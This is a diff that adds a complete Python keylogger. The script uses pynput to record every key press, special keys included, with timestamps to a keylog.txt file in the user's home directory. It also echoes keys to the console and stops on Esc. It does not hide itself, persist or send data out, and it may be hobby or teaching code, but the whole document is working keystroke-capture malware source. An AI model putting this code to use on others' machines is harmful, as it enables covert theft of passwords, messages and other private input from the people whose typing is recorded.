@@ -1,0 +1,61 @@
+from pynput import keyboard
+import logging
+import os
+
+# Configure logging to store keystrokes in a file
+HOME_DIRECTORY = os.path.expanduser("~")  # Save log file in the user's home directory
+LOG_FILE_PATH = os.path.join(HOME_DIRECTORY, "keylog.txt")
+
+# Set up logging
+logging.basicConfig(
+    filename=LOG_FILE_PATH,
+    level=logging.INFO,
+    format="%(asctime)s: %(message)s"
+)
+
+class Keylogger:
+    def __init__(self):
+        self.keys_pressed = []  # List to store keys temporarily
+
+    def on_key_press(self, key):
+        """
+        Handles key press events and logs the key.
+        """
+        try:
+            # Log alphanumeric keys
+            logging.info(f"Key pressed: {key.char}")
+            self.keys_pressed.append(key.char)
+        except AttributeError:
+            # Handle special keys (like Shift, Ctrl, etc.)
+            logging.info(f"Special key pressed: {key}")
+            self.keys_pressed.append(f"[{key}]")
+        
+        # Optional: Print the key to the console for debugging
+        print(f"Key pressed: {key}")
+
+    def on_key_release(self, key):
+        """
+        Handles key release events.
+        Stops the listener if the 'Esc' key is released.
+        """
+        if key == keyboard.Key.esc:
+            print("Stopping keylogger...")
+            return False  # Stop listener
+
+    def start(self):
+        """
+        Starts the keyboard listener to monitor key presses/releases.
+        """
+        with keyboard.Listener(
+            on_press=self.on_key_press,
+            on_release=self.on_key_release
+        ) as listener:
+            listener.join()
+
+# Entry point for the script
+if __name__ == "__main__":
+    print("Starting keylogger... (Press 'Esc' to stop)")
+    keylogger = Keylogger()
+    keylogger.start()
+    
+
